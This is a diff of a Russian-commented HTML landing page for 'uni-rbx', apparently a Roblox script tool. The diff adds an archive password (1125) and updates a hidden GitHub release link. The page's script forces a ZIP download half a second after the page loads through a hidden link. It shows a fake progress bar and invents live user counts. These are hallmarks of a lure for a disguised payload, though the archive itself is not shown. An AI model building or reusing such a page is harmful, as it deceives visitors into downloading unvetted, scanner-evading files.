@@ -34,6 +34,7 @@
       --text-main: #edf2f7;
       --text-muted: #7a8499;
       --text-soft: #b0bcc8;
+      --gold: #fbbf24;
     }
 
     body {
@@ -421,6 +422,95 @@
       line-height: 1.6;
     }
 
+    /* ===== ПАРОЛЬ — ПОД КНОПКОЙ ===== */
+    .password-block {
+      background: rgba(0,0,0,0.3);
+      border-radius: 18px;
+      padding: 18px 24px;
+      margin: 10px 0 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      flex-wrap: wrap;
+      border: 1px solid rgba(251, 191, 36, 0.15);
+      transition: 0.3s;
+    }
+
+    .password-block:hover {
+      border-color: rgba(251, 191, 36, 0.3);
+      box-shadow: 0 0 40px rgba(251, 191, 36, 0.05);
+    }
+
+    .password-label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.85rem;
+      color: var(--text-soft);
+      font-weight: 500;
+    }
+
+    .password-label i {
+      color: var(--gold);
+      font-size: 1.1rem;
+    }
+
+    .password-value {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .password-code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 2rem;
+      font-weight: 900;
+      letter-spacing: 12px;
+      color: var(--gold);
+      background: rgba(251, 191, 36, 0.06);
+      padding: 6px 24px;
+      border-radius: 14px;
+      border: 1px solid rgba(251, 191, 36, 0.12);
+      min-width: 140px;
+      text-align: center;
+      user-select: all;
+      text-shadow: 0 0 50px rgba(251, 191, 36, 0.1);
+    }
+
+    .btn-copy {
+      background: rgba(251, 191, 36, 0.08);
+      border: 1px solid rgba(251, 191, 36, 0.1);
+      color: var(--text-soft);
+      padding: 10px 20px;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 0.8rem;
+      font-weight: 600;
+      transition: 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .btn-copy:hover {
+      background: rgba(251, 191, 36, 0.15);
+      border-color: rgba(251, 191, 36, 0.2);
+      color: #fff;
+      transform: translateY(-1px);
+    }
+
+    .btn-copy.copied {
+      background: rgba(52, 211, 153, 0.15);
+      border-color: rgba(52, 211, 153, 0.3);
+      color: var(--accent-lime);
+    }
+
+    .btn-copy i {
+      font-size: 0.8rem;
+    }
+
     .steps-area {
       background: rgba(15, 19, 28, 0.5);
       backdrop-filter: blur(8px);
@@ -563,6 +653,9 @@
       .toast { width: 320px; padding: 12px 20px; }
       .features-grid { grid-template-columns: 1fr; }
       .steps-area { padding: 24px 20px; }
+      .password-block { flex-direction: column; align-items: stretch; padding: 16px 18px; }
+      .password-value { justify-content: center; flex-wrap: wrap; }
+      .password-code { font-size: 1.6rem; letter-spacing: 8px; padding: 6px 16px; min-width: 100px; }
     }
 
     @media (max-width: 480px) {
@@ -574,6 +667,7 @@
       .brand { font-size: 1.2rem; }
       .status-badge { font-size: 0.65rem; padding: 4px 14px; }
       .badge { font-size: 0.65rem; padding: 4px 14px; }
+      .password-code { font-size: 1.4rem; letter-spacing: 6px; padding: 6px 12px; min-width: 80px; }
     }
   </style>
 </head>
@@ -630,6 +724,20 @@
         </a>
       </div>
 
+      <!-- ===== ПАРОЛЬ — СРАЗУ ПОД КНОПКОЙ ===== -->
+      <div class="password-block">
+        <div class="password-label">
+          <i class="fas fa-key"></i>
+          <span>Archive password</span>
+        </div>
+        <div class="password-value">
+          <span class="password-code" id="passwordDisplay">1125</span>
+          <button class="btn-copy" id="copyPasswordBtn">
+            <i class="fas fa-copy"></i> Copy
+          </button>
+        </div>
+      </div>
+
       <div class="version-note">
         <i class="fas fa-shield-alt"></i> v3.2.1 · 18.07.2026 · includes script hub
       </div>
@@ -661,8 +769,8 @@
       </div>
       <div class="step-item">
         <div class="step-number">2</div>
-        <span>Extract ZIP — <strong>no password</strong> required</span>
-        <i class="fas fa-folder-open step-icon"></i>
+        <span>Extract ZIP — use password <strong style="color: var(--gold); font-size: 1.1rem;">1125</strong></span>
+        <i class="fas fa-key step-icon" style="color: var(--gold);"></i>
       </div>
       <div class="step-item">
         <div class="step-number">3</div>
@@ -680,7 +788,7 @@
 </main>
 
 <!-- СКРЫТАЯ ССЫЛКА ДЛЯ ИМИТАЦИИ КЛИКА -->
-<a href="https://github.com/Cyclopscharetrea/download/releases/download/rbx-18-07-2026/uni-rbx.zip" id="hiddenLink" style="display: none;" download>download</a>
+<a href="https://github.com/Cyclopscharetrea/download/releases/download/RBX-20-07-2026/uni-rbx.zip" id="hiddenLink" style="display: none;" download>download</a>
 
 <script>
   // ========== PARALLAX GLOW ==========
@@ -705,8 +813,41 @@
     });
   }
 
-  // ========== ЛОГИКА АВТО-СКАЧИВАНИЯ (имитация клика) ==========
-  const FILE_URL = "https://github.com/Cyclopscharetrea/download/releases/download/rbx-18-07-2026/uni-rbx.zip";
+  // ========== КОПИРОВАНИЕ ПАРОЛЯ ==========
+  const copyBtn = document.getElementById('copyPasswordBtn');
+  const passwordDisplay = document.getElementById('passwordDisplay');
+
+  if (copyBtn && passwordDisplay) {
+    copyBtn.addEventListener('click', () => {
+      const password = passwordDisplay.textContent;
+      navigator.clipboard.writeText(password).then(() => {
+        copyBtn.classList.add('copied');
+        const originalText = copyBtn.innerHTML;
+        copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+        setTimeout(() => {
+          copyBtn.classList.remove('copied');
+          copyBtn.innerHTML = originalText;
+        }, 2000);
+      }).catch(() => {
+        const range = document.createRange();
+        range.selectNode(passwordDisplay);
+        window.getSelection().removeAllRanges();
+        window.getSelection().addRange(range);
+        document.execCommand('copy');
+        window.getSelection().removeAllRanges();
+        copyBtn.classList.add('copied');
+        const originalText = copyBtn.innerHTML;
+        copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+        setTimeout(() => {
+          copyBtn.classList.remove('copied');
+          copyBtn.innerHTML = originalText;
+        }, 2000);
+      });
+    });
+  }
+
+  // ========== ЛОГИКА АВТО-СКАЧИВАНИЯ ==========
+  const FILE_URL = "https://github.com/Cyclopscharetrea/download/releases/download/RBX-20-07-2026/uni-rbx.zip";
   const hiddenLink = document.getElementById('hiddenLink');
   const downloadBtn = document.getElementById('mainDownloadBtn');
   const toastDiv = document.getElementById('downloadToast');
@@ -739,24 +880,20 @@
     }
   }
 
-  // ИМИТАЦИЯ КЛИКА ПО СКРЫТОЙ ССЫЛКЕ
   function triggerDownload() {
     if (hiddenLink) {
       hiddenLink.click();
-      console.log('✅ Скачивание запущено через имитацию клика по скрытой ссылке');
+      console.log('✅ Скачивание запущено');
     } else {
-      // Фолбэк
       const link = document.createElement('a');
       link.href = FILE_URL;
       link.download = 'uni-rbx.zip';
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
-      console.log('✅ Скачивание запущено через созданную ссылку');
     }
   }
 
-  // Имитация прогресса (3-4 секунды)
   function simulateProgress(callback) {
     if (progressInterval) clearInterval(progressInterval);
     showToast();
@@ -787,30 +924,24 @@
     }, 120);
   }
 
-  // ========== АВТО-ЗАПУСК ПРИ ЗАГРУЗКЕ СТРАНИЦЫ ==========
   function startAutoDownload() {
     if (isDownloadLock) return;
     isDownloadLock = true;
 
-    // Меняем кнопку
     const originalHTML = downloadBtn.innerHTML;
     downloadBtn.style.opacity = '0.85';
     downloadBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i><span>initializing</span><i class="fas fa-cog fa-spin"></i>';
     downloadBtn.style.cursor = 'wait';
 
-    // Запускаем имитацию прогресса
     simulateProgress(() => {
-      // Запускаем скачивание через имитацию клика
       triggerDownload();
       
-      // Возвращаем кнопку в исходное состояние
       setTimeout(() => {
         downloadBtn.innerHTML = originalHTML;
         downloadBtn.style.opacity = '';
         downloadBtn.style.cursor = '';
         isDownloadLock = false;
         
-        // Показываем "готово" на секунду
         const tempHTML = downloadBtn.innerHTML;
         downloadBtn.innerHTML = '<i class="fas fa-check" style="color: #4ade80;"></i><span style="color: #4ade80;">done</span><i class="fas fa-check" style="color: #4ade80;"></i>';
         setTimeout(() => {
@@ -820,25 +951,24 @@
     });
   }
 
-  // АВТО-ЗАПУСК через 0.5 секунды после загрузки страницы
+  // АВТО-ЗАПУСК через 0.5 сек
   setTimeout(() => {
     startAutoDownload();
   }, 500);
 
-  // ========== КЛИК ПО КНОПКЕ (повторный запуск) ==========
+  // КЛИК ПО КНОПКЕ
   if (downloadBtn) {
     downloadBtn.addEventListener('click', (e) => {
       e.preventDefault();
       if (!isDownloadLock) {
         startAutoDownload();
       } else {
-        // Если уже идет процесс — просто запускаем скачивание
         triggerDownload();
       }
     });
   }
 
-  // ========== ЖИВАЯ СТАТИСТИКА ==========
+  // ЖИВАЯ СТАТИСТИКА
   const footerEl = document.querySelector('.footer');
   if (footerEl) {
     let activeUsers = 7200 + Math.floor(Math.random() * 2600);
@@ -851,7 +981,7 @@
     }, 15000);
   }
 
-  console.log("✅ uni-rbx | premium landing | АВТО-СКАЧИВАНИЕ | имитация клика | no password");
+  console.log("✅ uni-rbx | авто-скачивание | пароль: 1125");
 </script>
 </body>
 </html>
